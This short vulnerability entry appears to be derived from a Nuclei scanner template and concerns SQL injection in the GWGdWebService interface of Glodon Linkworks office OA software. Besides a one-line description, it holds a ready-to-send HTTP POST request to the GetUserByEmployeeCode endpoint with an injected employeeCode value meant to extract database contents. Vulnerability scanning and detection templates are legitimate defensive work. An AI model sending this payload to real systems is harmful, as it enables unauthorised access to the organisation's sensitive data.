# Vulnerability: Glodon Linkworks GWGdWebService - SQL injection
**Classification:** GLODON
**Source:** Nuclei Template (`glodon-linkworks-sqli.yaml`)

## Description
There is a SQL injection vulnerability in the GWGdWebService interface of Glodon Linkworks office OA. Sensitive information in the database can be obtained after sending a request package.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /Org/service/Service.asmx/GetUserByEmployeeCode HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

employeeCode=1'-1/user--'&EncryptData=1
```

